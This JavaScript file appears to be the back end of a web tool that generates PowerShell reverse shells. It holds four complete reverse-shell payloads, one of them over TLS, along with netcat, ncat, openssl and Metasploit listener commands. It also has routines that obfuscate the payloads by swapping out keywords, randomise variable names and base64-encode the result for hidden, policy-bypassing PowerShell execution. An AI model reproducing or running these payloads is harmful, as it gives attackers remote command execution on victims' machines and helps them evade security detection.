const psOne = '$LHOST = "<host>"; $LPORT = <port>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()';

const psTwo = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient("<host>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';

const psThree = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient("<host>", <port>);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()}WriteToStream "";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"';

const psFourTLS = '$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient("<host>", <port>);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient("cloudflare-dns.com",$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + "SHELL> ");$StreamWriter.Flush()};WriteToStream "";while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()';

const psRevRaw = [psOne, psTwo, psThree, psFourTLS];

const listenerOne = 'nc -lvnp <port>'; // nc cleartext tcp

const listenerTwo = 'nc -u -lvp <port>'; // nc cleartext udp

const listenerThree = 'sudo ncat -lvnp <port>'; // ncat cleartext tcp

const listenerFour = 'sudo ncat --ssl -lvnp <port>'; // ncat TLS // issues with this so far

const listenerFive = 'sudo openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 30 -nodes; sudo openssl s_server -quiet -key key.pem -cert cert.pem -port <port>' // openssl TLS

const listenerSix = 'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 127.0.0.1; set lport <port>; exploit"' // msfconsole (metasploit) TCP // needs testing

const listenerSeven = 'sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_udp; set lhost 127.0.0.1; set lport <port>; exploit"' // msfconsole (metasploit) UDP // needs testing

const listenersRaw = [listenerOne, listenerTwo, listenerThree, listenerFour, listenerFive, listenerSix, listenerSeven];

// mangle
const mangleExprPre = '$mangledStr=\'';
const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\@\@\@\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i]};invoke-expression $demangledStr&'

// const mangleExprPost = '\';$staticStrArr="new","net","client","tcp","object","new","mkfifo","socket","tmp","security","ssl","stream","\$","buff","out","system","proto","expre","invoke","flush","auth",".",";";$replaceStrArr="dfi1","wiggleworm","nOt4t0","d00d1eb0p","unpotat","soiledpeanuts","tinylittledragons","thetiniestofhorses","capitalismisascam","bramblebush","ins4ecureSilly","456yt","\\@\\@\\@\\^","muscleperverts","inniebellybutton","ponishouldponiponi","ayylemone","testicles","lololol","teppidwater","orderhotwaterataniceresteraunt","deee","onoamouse";$demangledStr=$mangledStr;for($i=0;$i -le $staticStrArr.length;$i++){$demangledStr = $demangledStr -replace $replaceStrArr[$i],$staticStrArr[$i];$staticStrArr[$i];$replaceStrArr[$i]};invoke-expression $demangledStr&'

const replaceStrArr = ['dfi1', 'wiggleworm', 'nOt4t0', 'd00d1eb0p', 'unpotat', 'soiledpeanuts', 'tinylittledragons', 'thetiniestofhorses', 'capitalismisascam','bramblebush', 'ins4ecureSilly', '456yt', '@@@^', 'muscleperverts', 'inniebellybutton', 'ponishouldponiponi', 'ayylemone', 'testicles', 'lololol', 'teppidwater', 'orderhotwaterataniceresteraunt', 'deee', 'onoamouse'];

const findStrArr = [/new/gi, /net/gi, /client/gi, /tcp/gi, /object/gi, /new/gi, /mkfifo/gi, /socket/gi, /tmp/gi, /security/gi, /ssl/gi, /stream/gi, /\$/gi, /buff/gi, /out/gi, /system/gi, /proto/gi, /expre/gi, /invoke/gi, /flush/gi, /auth/gi, /\./gi, /;/gi];

const staticStrArr = ['new', 'net', 'client', 'tcp', 'object', 'new', 'mkfifo', 'socket', 'tmp', 'security', 'ssl', 'stream', '$', 'buff', 'out', 'system', 'proto', 'expre', 'invoke', 'flush', 'auth', '.', ';'];

function mangleRevShell(revShellStr) {
    let mangiemut = revShellStr;

    for(let i=0; i<findStrArr.length; i++) {
        mangiemut = mangiemut.replaceAll(findStrArr[i], replaceStrArr[i]);
    }

    const mangleExprExe = mangleExprPre+mangiemut+mangleExprPost;
    return mangleExprExe;
}

function demangleRevShell(mangledRevShellStr) {
    let cutedoggy = mangledRevShellStr;
    for(let i=0; i<findStrArr.length; i++) {
        cutedoggy = cutedoggy.replaceAll(replaceStrArr[i], staticStrArr[i]);
    }

    return cutedoggy;
}

function encodeUTF16LE(str) { // props Keveun https://stackoverflow.com/questions/24379446/utf-8-to-utf-16le-javascript
    var out, i, len, c;
    var char2, char3;

    out = "";
    len = str.length;
    i = 0;
    while(i < len) {
        c = str.charCodeAt(i++);
        switch(c >> 4)
        { 
          case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7:
            // 0xxxxxxx
            out += str.charAt(i-1);
            break;
          case 12: case 13:
            // 110x xxxx   10xx xxxx
            char2 = str.charCodeAt(i++);
            out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
            out += str.charAt(i-1);
            break;
          case 14:
            // 1110 xxxx  10xx xxxx  10xx xxxx
            char2 = str.charCodeAt(i++);
            char3 = str.charCodeAt(i++);
            out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
            break;
        }
    }

    var byteArray = new Uint8Array(out.length * 2);
    for (var i = 0; i < out.length; i++) {
        byteArray[i*2] = out.charCodeAt(i); // & 0xff;
        byteArray[i*2+1] = out.charCodeAt(i) >> 8; // & 0xff;
    }

    return String.fromCharCode.apply( String, byteArray );
}


function genShell() {
    const host = document.getElementById("host").value;
    const port = document.getElementById("port").value;
    const rstype = document.getElementById("rstype").value;
    const listenertype = document.getElementById("listenertype").value;
    const minLen = document.getElementById("minLen").value;
    const maxLen = document.getElementById("maxLen").value;

    const psRevStringRaw = psRevRaw[rstype];
    encodePS(psRevStringRaw);
}

function randInt(min=2, max=7) {
    const minCeil = Math.ceil(min);
    const maxFloor = Math.floor(max);
    return Math.floor(Math.random() * (maxFloor - minCeil) + minCeil);
}

function randVarname(minLen=2, maxLen=7, charSet='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789') {
    let out = '';
    const randLen = randInt(minLen, maxLen);
    const charsLen = charSet.length;

    for (let i=0; i<randLen; i++) {
        out += charSet.charAt(Math.floor(Math.random() * charsLen));
    }

    return '$'+out; // prepend the $ for powersuck
}

function configShell(rawShellString, host, port/*, shell*/) {
    let moddedCmdString = rawShellString;
    moddedCmdString = moddedCmdString.replaceAll(/<host>/gi, host);
    moddedCmdString = moddedCmdString.replaceAll(/<port>/gi, port);

    // moddedCmdString = moddedCmdString.replaceAll(/<shell>/gi, shell); // for when we evolve past ps lmao
    return moddedCmdString;
}

function psEncodeBase64Exe(shellStr) {
    const psEncodedlUTF16LE = encodeUTF16LE(shellStr);
    const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
    return base64EncodedPSExecutable;
}

function encodePS(rawShellString, listenerShow=true) {
    const host = document.getElementById("host").value;
    const port = document.getElementById("port").value;
    const rstype = document.getElementById("listenertype").value;
    const minLen = document.getElementById("minLen").value;
    const maxLen = document.getElementById("maxLen").value;

    let matchies = rawShellString.match(/\$(?!null|zero|false|true|script|buffer)[a-z0-9-_]{1,30}/gi);

    const varsLen = matchies.length;

    let randVarSubArr = new Array();
    let moddedCmdString = configShell(rawShellString, host, port);

    for(let i=0; i<varsLen; i++) {
        const newRandVar = randVarname(minLen, maxLen);

        randVarSubArr.push(newRandVar);

        moddedCmdString = moddedCmdString.replaceAll(matchies[i], newRandVar);
    }

    // for `powershell -e $base64EncodedData` to work, the commands need to be first encoded into Unicode/UTF-16 LE (Windows default) than base64 encoded
    // const psEncodedlUTF16LE = encodeUTF16LE(moddedCmdString);
    // const base64EncodedPSExecutable = "powershell -e " + btoa(psEncodedlUTF16LE);
    const base64EncodedPSExecutable = psEncodeBase64Exe(moddedCmdString);
    const mangledCmd = mangleRevShell(moddedCmdString);
    const mangEncCmd = psEncodeBase64Exe(mangleRevShell(moddedCmdString).slice(0, -1));
    console.log(mangleRevShell(moddedCmdString).slice(0, -1));
    const listener = configShell(listenersRaw[rstype], host, port);
    document.getElementById("hiddenOutput").innerHTML = base64EncodedPSExecutable;
    document.getElementById("hiddenUnencoded").innerHTML = moddedCmdString;
    document.getElementById("mangledpayload").innerHTML = mangledCmd;
    document.getElementById("mangledencodedpayload").innerHTML = mangEncCmd;
    document.getElementById("listener").innerHTML = listener;
    document.getElementById("encodedDiv").style.display = "block";
    document.getElementById("unencodedDiv").style.display = "block";
    document.getElementById("mangledDiv").style.display = "block";
    document.getElementById("mangledEncodedDiv").style.display = "block";
    if(listenerShow) {
        document.getElementById("listenerDiv").style.display = "block";
    }

}

function copyCmd(textarea, doneMsg) {
    const cmdCopyText = document.getElementById(textarea); // no .value here

    cmdCopyText.select(); // select da text
    cmdCopyText.setSelectionRange(0, 99999); // mobilefags

    navigator.clipboard.writeText(cmdCopyText.value); // copy to clipboard

    // flash the "done" message for 500ms
    document.getElementById(doneMsg).style.display = "inline";

    setTimeout(function() {
        document.getElementById(doneMsg).style.display = "none";
        document.getSelection().removeAllRanges()
    }, 500);
}

function swapMode(mode) {
    if(mode == 'revshell') {
        document.getElementById('revshellgencontainer').style.display = "block";
        document.getElementById('encodepscontainer').style.display = "none";
    } else if(mode == 'psencode') {
        document.getElementById('encodepscontainer').style.display = "block";
        document.getElementById('revshellgencontainer').style.display = "none";
        document.getElementById('listenerDiv').style.display = "none";
        document.getElementById("unencodedDiv").style.display = "none";
    }

    document.getElementById('encodedDiv').style.display = "none"; // output div
}